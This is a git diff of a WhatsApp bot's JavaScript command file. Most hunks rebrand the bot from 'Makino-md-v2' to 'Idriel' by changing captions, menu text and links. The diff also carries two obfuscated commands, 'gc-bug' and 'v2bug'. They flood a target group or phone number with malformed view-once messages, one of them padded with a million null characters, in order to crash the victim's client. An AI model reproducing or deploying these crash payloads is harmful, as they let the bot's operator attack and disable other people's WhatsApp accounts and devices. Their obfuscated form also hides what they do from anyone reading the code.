         Taira.sendMessage(from, { react: { text: "🌝", key: m.key } })
         if (/image/.test(mime)) {
           let media = await quoted.download()
-          let encmedia = await Taira.sendImageAsSticker(m.chat, media, m, { packname: '🐦Makino-md-v2', author: global.author })
+          let encmedia = await Taira.sendImageAsSticker(m.chat, media, m, { packname: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱', author: global.author })
           await fs.unlinkSync(encmedia)
         } else if (/video/.test(mime)) {
           if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
           let media = await quoted.download()
-          let encmedia = await Taira.sendVideoAsSticker(m.chat, media, m, { packname: '🐦Makino-md-v2', author: global.author })
+          let encmedia = await Taira.sendVideoAsSticker(m.chat, media, m, { packname: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱', author: global.author })
           await fs.unlinkSync(encmedia)
         } else {
           reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
@@ -4405,7 +4405,7 @@ case 'tovv': {
 ] */
         let button1ssMessages = {
           image: { url: waifudd.data.url },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           /*  footer: `${global.BotName}`,
             buttons: wbuttsss,
             headerType: 4 */
@@ -4430,7 +4430,7 @@ case 'tovv': {
    ] */
         let button12ssMessages = {
           image: { url: waifudd.data.url },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           /* footer: `${global.BotName}`,
           buttons: wbuttsss,
           headerType: 4 */
@@ -4452,7 +4452,7 @@ case 'tovv': {
           ]  */
         let xx1button3Messages = {
           image: { url: waifudd.data.url },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           /*  buttons: xxhnekobot,
           headerType: 1 */
         }
@@ -4473,7 +4473,7 @@ case 'tovv': {
 ] */
         let button112ssMessages = {
           image: { url: waifudd.data.url },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           /*   footer: `${global.BotName}`,
              buttons: wbuttsss,
              headerType: 4 */
@@ -4522,7 +4522,7 @@ case 'tovv': {
         ]
         let buttonssMessage = {
           image: { url: waifud.data.url },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           footer: `${global.BotName}`,
           buttons: wbutsss,
           headerType: 4
@@ -4546,7 +4546,7 @@ case 'tovv': {
         ]
         let buttonssMessages = {
           image: { url: waifudd.data.url },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           footer: `${global.BotName}`,
           buttons: wbuttsss,
           headerType: 4
@@ -4864,8 +4864,8 @@ case 'tovv': {
         ]
         let wal = {
           image: { url: wallpaper[i].image },
-          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
-          footer: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          caption: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+          footer: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
           buttons: walb,
           headerType: 4
         }
@@ -4957,7 +4957,7 @@ case 'tovv': {
           ] */
         let button4Messagess = {
           image: { url: waifuddd.data.url },
-          caption: '🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
+          caption: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
           /*buttons: wbuttsssr,
           headerType: 4 */
         }
@@ -4979,7 +4979,7 @@ case 'tovv': {
           ] */
         let buttonMessagessf = {
           image: { url: waifuddd.data.url },
-          caption: '🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
+          caption: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
           /*    buttons: wbuttsssr,
               headerType: 2  */
         }
@@ -5001,7 +5001,7 @@ case 'tovv': {
           ] */
         let buttonMessagessfgr = {
           image: { url: waifuddd.data.url },
-          caption: '🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
+          caption: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
           /*  buttons: wbuttsssr,
             headerType: 2 */
         }
@@ -5055,7 +5055,7 @@ case 'tovv': {
           await Taira.sendMessage(from, { react: { text: "📄", key: m.key } });
          const helpMenuText = `
 ╭════════════════ ᐖ
-┃ *♱MAKINO-MD-V2♱♡⃤* 
+┃ *╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱* 
 ╰════════════════ ᐖ
 ╭════════════════ ᐖ
 ┃
@@ -5354,7 +5354,7 @@ if(global.menutype === "v1"){
                     text: helpMenuText
                   }),
                   footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "            ♱MAKINO-MD-V2♱♡⃤"
+                    text: "            ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱"
                   }),
                   header: proto.Message.InteractiveMessage.Header.create({
                     ...(await prepareWAMessageMedia({ image: { url: 'https://graph.org/file/b06744135f2f12ec4b4be.jpg' } }, { upload: Taira.waUploadToServer })),
@@ -5376,7 +5376,7 @@ if(global.menutype === "v1"){
                       },
                       {
                         "name": "cta_url",
-                        "buttonParamsJson": `{"display_text":"REPO 🔗 ","url":"https://github.com/anonphoenix007/MAKINO-MD-V2","merchant_url":"https://github.com/anonphoenix007/MAKINO-MD-V2"}`
+                        "buttonParamsJson": `{"display_text":"REPO 🔗 ","url":"","merchant_url":""}`
 
                       },
                       {
@@ -5416,15 +5416,15 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: "Taira Tech",
+newsletterName: "𝙻𝚄𝚇𝙸4𝙺𝙸𝚃𝚂𝚄",
 newsletterJid: "120363320283062687@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
-title: "♱MAKINO-MD-V2♱♡⃤",
-body: "Taira Makino",
-thumbnailUrl: "https://telegra.ph/file/dfad7a7afb54498391945.jpg",
-sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
+title: "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱",
+body: "𝙻𝚄𝚇𝙸4𝙺𝙸𝚃𝚂𝚄",
+thumbnailUrl: "https://telegra.ph/file/00c1c8887767469244691.jpg",
+sourceUrl: "https://chat.whatsapp.com/Lah0hBJn6ro4lXbLJik0Y2",
 mediaType: 1,
 renderLargerThumbnail: true
 }
@@ -5440,10 +5440,10 @@ quoted: m
       caption: helpMenuText,
       contextInfo: {
       externalAdReply: {
-      title: '♱MAKINO-MD-V2♱♡⃤',
-      body: 'Taira Makino',
+      title: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱',
+      body: '𝙻𝚄𝚇𝙸4𝙺𝙸𝚃𝚂𝚄',
       thumbnailUrl: "https://telegra.ph/file/dfad7a7afb54498391945.jpg",
-      sourceUrl: `https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r`,
+      sourceUrl: `https://chat.whatsapp.com/ChpEIqZZSKOKyP5XAzOprm`,
       mediaType: 1,
       renderLargerThumbnail: true
       }
@@ -5480,7 +5480,7 @@ break;
           if (isBanChat) return reply(mess.bangc);
           Taira.sendMessage(from, { react: { text: "✨", key: m.key } })
 
-          reply(`Hi ${pushname}👋 ,I am MAKINO-MD-V2 by Tᴀɪʀᴀ Mᴀᴋɪɴᴏ. Do you need any help ?`)
+          reply(`Hi ${pushname}👋 ,I am ♱𝙸𝚍𝚛𝚒𝚎𝚕⃤ by 𝙻𝚄𝚇𝙸4𝙺𝙸𝚃𝚂𝚄. Do you need any help ?`)
         }
 
         break;
@@ -5884,7 +5884,7 @@ const _0x508f74=_0x1757;(function(_0x243297,_0x492073){const _0x67fb79=_0x1757,_
 }
 break */
 case 'gc-bug': {
-const _0x414556=_0x2375;function _0x5f13(){const _0x754b60=['2095356iiiUUd','127631dWHuqR','chat','524070spGpND','You\x20have\x20\x20Successfully\x20Sent\x20Bugs\x20to\x20','.\x20🔥\x20\x0a\x0a\x20Wait\x20some\x20minutes\x20or\x20say\x20cheese\x20to\x20your\x20account.','{\x20display_text\x20:\x20\x27⿻Taira\x20Makino⿻\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','Message','2825784yRHRmy','groupAcceptInvite','♱MAKINO-MD-V2♱♡⃤','cta_url','message','152PovIfN','split','relayMessage','396420JqLokw','9VmKKdN','repeat','119694jPFcUR','9907390MJCiPv','Processing\x20.....','5AqKOoO','Use\x20like\x20.','\x20Using\x20'];_0x5f13=function(){return _0x754b60;};return _0x5f13();}(function(_0xff205e,_0x430d2f){const _0xe6bbe8=_0x2375,_0x3f5a16=_0xff205e();while(!![]){try{const _0x2b2510=parseInt(_0xe6bbe8(0x154))/0x1+parseInt(_0xe6bbe8(0x160))/0x2+-parseInt(_0xe6bbe8(0x14c))/0x3+-parseInt(_0xe6bbe8(0x15d))/0x4+parseInt(_0xe6bbe8(0x15a))/0x5*(parseInt(_0xe6bbe8(0x157))/0x6)+-parseInt(_0xe6bbe8(0x15e))/0x7*(-parseInt(_0xe6bbe8(0x151))/0x8)+parseInt(_0xe6bbe8(0x155))/0x9*(parseInt(_0xe6bbe8(0x158))/0xa);if(_0x2b2510===_0x430d2f)break;else _0x3f5a16['push'](_0x3f5a16['shift']());}catch(_0x4b377c){_0x3f5a16['push'](_0x3f5a16['shift']());}}}(_0x5f13,0x863ab));if(!isCreator)return reply(mess['botowner']);if(!q)return reply(_0x414556(0x15b)+command+'\x20https://chat.whatsapp.com/');reply(_0x414556(0x159));let result=args[0x0][_0x414556(0x152)]('https://chat.whatsapp.com/')[0x1],target=await Taira[_0x414556(0x14d)](result);function _0x2375(_0x4a22a1,_0x14330c){const _0x5f13b2=_0x5f13();return _0x2375=function(_0x2375cd,_0x56309c){_0x2375cd=_0x2375cd-0x148;let _0xa0907c=_0x5f13b2[_0x2375cd];return _0xa0907c;},_0x2375(_0x4a22a1,_0x14330c);}for(let j=0x0;j<0x5;j++){var etc=generateWAMessageFromContent(m[_0x414556(0x15f)],proto[_0x414556(0x14b)]['fromObject']({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x414556(0x14e)},'footer':{'text':'›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20♱MAKINO-MD-V2♱♡⃤'},'nativeFlowMessage':{'buttons':[{'name':_0x414556(0x14f),'buttonParamsJson':_0x414556(0x14a)}],'messageParamsJson':'\x00'[_0x414556(0x156)](0xf4240)}}}}}),{'userJid':m[_0x414556(0x15f)],'quoted':statrp});await Taira[_0x414556(0x153)](target,etc[_0x414556(0x150)],{'messageId':etc['key']['id']}),await sleep(0x2bc);}reply(_0x414556(0x148)+target+_0x414556(0x15c)+command+_0x414556(0x149));
+const _0x414556=_0x2375;function _0x5f13(){const _0x754b60=['2095356iiiUUd','127631dWHuqR','chat','524070spGpND','You\x20have\x20\x20Successfully\x20Sent\x20Bugs\x20to\x20','.\x20🔥\x20\x0a\x0a\x20Wait\x20some\x20minutes\x20or\x20say\x20cheese\x20to\x20your\x20account.','{\x20display_text\x20:\x20\x27⿻Taira\x20idriel⿻\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','Message','2825784yRHRmy','groupAcceptInvite','╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱','cta_url','message','152PovIfN','split','relayMessage','396420JqLokw','9VmKKdN','repeat','119694jPFcUR','9907390MJCiPv','Processing\x20.....','5AqKOoO','Use\x20like\x20.','\x20Using\x20'];_0x5f13=function(){return _0x754b60;};return _0x5f13();}(function(_0xff205e,_0x430d2f){const _0xe6bbe8=_0x2375,_0x3f5a16=_0xff205e();while(!![]){try{const _0x2b2510=parseInt(_0xe6bbe8(0x154))/0x1+parseInt(_0xe6bbe8(0x160))/0x2+-parseInt(_0xe6bbe8(0x14c))/0x3+-parseInt(_0xe6bbe8(0x15d))/0x4+parseInt(_0xe6bbe8(0x15a))/0x5*(parseInt(_0xe6bbe8(0x157))/0x6)+-parseInt(_0xe6bbe8(0x15e))/0x7*(-parseInt(_0xe6bbe8(0x151))/0x8)+parseInt(_0xe6bbe8(0x155))/0x9*(parseInt(_0xe6bbe8(0x158))/0xa);if(_0x2b2510===_0x430d2f)break;else _0x3f5a16['push'](_0x3f5a16['shift']());}catch(_0x4b377c){_0x3f5a16['push'](_0x3f5a16['shift']());}}}(_0x5f13,0x863ab));if(!isCreator)return reply(mess['botowner']);if(!q)return reply(_0x414556(0x15b)+command+'\x20https://chat.whatsapp.com/');reply(_0x414556(0x159));let result=args[0x0][_0x414556(0x152)]('https://chat.whatsapp.com/')[0x1],target=await Taira[_0x414556(0x14d)](result);function _0x2375(_0x4a22a1,_0x14330c){const _0x5f13b2=_0x5f13();return _0x2375=function(_0x2375cd,_0x56309c){_0x2375cd=_0x2375cd-0x148;let _0xa0907c=_0x5f13b2[_0x2375cd];return _0xa0907c;},_0x2375(_0x4a22a1,_0x14330c);}for(let j=0x0;j<0x5;j++){var etc=generateWAMessageFromContent(m[_0x414556(0x15f)],proto[_0x414556(0x14b)]['fromObject']({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x414556(0x14e)},'footer':{'text':'›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱'},'nativeFlowMessage':{'buttons':[{'name':_0x414556(0x14f),'buttonParamsJson':_0x414556(0x14a)}],'messageParamsJson':'\x00'[_0x414556(0x156)](0xf4240)}}}}}),{'userJid':m[_0x414556(0x15f)],'quoted':statrp});await Taira[_0x414556(0x153)](target,etc[_0x414556(0x150)],{'messageId':etc['key']['id']}),await sleep(0x2bc);}reply(_0x414556(0x148)+target+_0x414556(0x15c)+command+_0x414556(0x149));
   }
 break
 
@@ -5894,7 +5894,7 @@ const _0x3b65a6=_0x1c16;function _0x1c16(_0x82e00b,_0x16a393){const _0xb1f5d9=_0
 }
 break*/
 case 'v2bug': {
-const _0x406bbf=_0x2616;function _0x2616(_0xea05d8,_0x307608){const _0x4f6cf2=_0x4f6c();return _0x2616=function(_0x26166b,_0x370468){_0x26166b=_0x26166b-0x115;let _0x24412f=_0x4f6cf2[_0x26166b];return _0x24412f;},_0x2616(_0xea05d8,_0x307608);}function _0x4f6c(){const _0x394049=['botowner','Message','558tvTHWH','He\x27s\x20gone\x20🤭🔪\x0aIf\x20he\x20isn\x27t\x20dead,\x20use\x20a\x20higher\x20amount.','Processing.....','1056714qKaLqV','message','Use\x20like\x20.','373612LbuKwd','chat','replace','startsWith','1639888qzwWCh','3tZGYOm','fromObject','\x202347080968564|1','12dkkirz','124980SUiggd','@s.whatsapp.net','905884xinOSZ','split','110853tdzGBs','Target\x20number\x20cannot\x20start\x20with\x200.'];_0x4f6c=function(){return _0x394049;};return _0x4f6c();}(function(_0x431267,_0x1336e4){const _0x3d5068=_0x2616,_0x1ca78f=_0x431267();while(!![]){try{const _0x356dca=parseInt(_0x3d5068(0x124))/0x1+-parseInt(_0x3d5068(0x117))/0x2*(-parseInt(_0x3d5068(0x11c))/0x3)+parseInt(_0x3d5068(0x11f))/0x4*(-parseInt(_0x3d5068(0x120))/0x5)+-parseInt(_0x3d5068(0x12b))/0x6+-parseInt(_0x3d5068(0x122))/0x7+parseInt(_0x3d5068(0x11b))/0x8+parseInt(_0x3d5068(0x128))/0x9;if(_0x356dca===_0x1336e4)break;else _0x1ca78f['push'](_0x1ca78f['shift']());}catch(_0x3d69bf){_0x1ca78f['push'](_0x1ca78f['shift']());}}}(_0x4f6c,0x1dd4c));if(!isCreator)return reply(mess[_0x406bbf(0x126)]);if(!q)return reply(_0x406bbf(0x116)+command+_0x406bbf(0x11e));let one=q[_0x406bbf(0x123)]('|')[0x0],two=one[_0x406bbf(0x119)](/[^0-9]/g,'');if(two[_0x406bbf(0x11a)]('0'))return reply(_0x406bbf(0x125));let target=two+_0x406bbf(0x121),count=q[_0x406bbf(0x123)]('|')[0x1];reply(_0x406bbf(0x12a));for(let j=0x0;j<count;j++){var etc=generateWAMessageFromContent(m[_0x406bbf(0x118)],proto[_0x406bbf(0x127)][_0x406bbf(0x11d)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'♱MAKINO-MD-V2♱♡⃤','sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':target,'quoted':m});await Taira['relayMessage'](target,etc[_0x406bbf(0x115)],{'messageId':etc['key']['id']});}await reply(_0x406bbf(0x129));
+const _0x406bbf=_0x2616;function _0x2616(_0xea05d8,_0x307608){const _0x4f6cf2=_0x4f6c();return _0x2616=function(_0x26166b,_0x370468){_0x26166b=_0x26166b-0x115;let _0x24412f=_0x4f6cf2[_0x26166b];return _0x24412f;},_0x2616(_0xea05d8,_0x307608);}function _0x4f6c(){const _0x394049=['botowner','Message','558tvTHWH','He\x27s\x20gone\x20🤭🔪\x0aIf\x20he\x20isn\x27t\x20dead,\x20use\x20a\x20higher\x20amount.','Processing.....','1056714qKaLqV','message','Use\x20like\x20.','373612LbuKwd','chat','replace','startsWith','1639888qzwWCh','3tZGYOm','fromObject','\x202347080968564|1','12dkkirz','124980SUiggd','@s.whatsapp.net','905884xinOSZ','split','110853tdzGBs','Target\x20number\x20cannot\x20start\x20with\x200.'];_0x4f6c=function(){return _0x394049;};return _0x4f6c();}(function(_0x431267,_0x1336e4){const _0x3d5068=_0x2616,_0x1ca78f=_0x431267();while(!![]){try{const _0x356dca=parseInt(_0x3d5068(0x124))/0x1+-parseInt(_0x3d5068(0x117))/0x2*(-parseInt(_0x3d5068(0x11c))/0x3)+parseInt(_0x3d5068(0x11f))/0x4*(-parseInt(_0x3d5068(0x120))/0x5)+-parseInt(_0x3d5068(0x12b))/0x6+-parseInt(_0x3d5068(0x122))/0x7+parseInt(_0x3d5068(0x11b))/0x8+parseInt(_0x3d5068(0x128))/0x9;if(_0x356dca===_0x1336e4)break;else _0x1ca78f['push'](_0x1ca78f['shift']());}catch(_0x3d69bf){_0x1ca78f['push'](_0x1ca78f['shift']());}}}(_0x4f6c,0x1dd4c));if(!isCreator)return reply(mess[_0x406bbf(0x126)]);if(!q)return reply(_0x406bbf(0x116)+command+_0x406bbf(0x11e));let one=q[_0x406bbf(0x123)]('|')[0x0],two=one[_0x406bbf(0x119)](/[^0-9]/g,'');if(two[_0x406bbf(0x11a)]('0'))return reply(_0x406bbf(0x125));let target=two+_0x406bbf(0x121),count=q[_0x406bbf(0x123)]('|')[0x1];reply(_0x406bbf(0x12a));for(let j=0x0;j<count;j++){var etc=generateWAMessageFromContent(m[_0x406bbf(0x118)],proto[_0x406bbf(0x127)][_0x406bbf(0x11d)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱','sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':target,'quoted':m});await Taira['relayMessage'](target,etc[_0x406bbf(0x115)],{'messageId':etc['key']['id']});}await reply(_0x406bbf(0x129));
 }
 break 
 
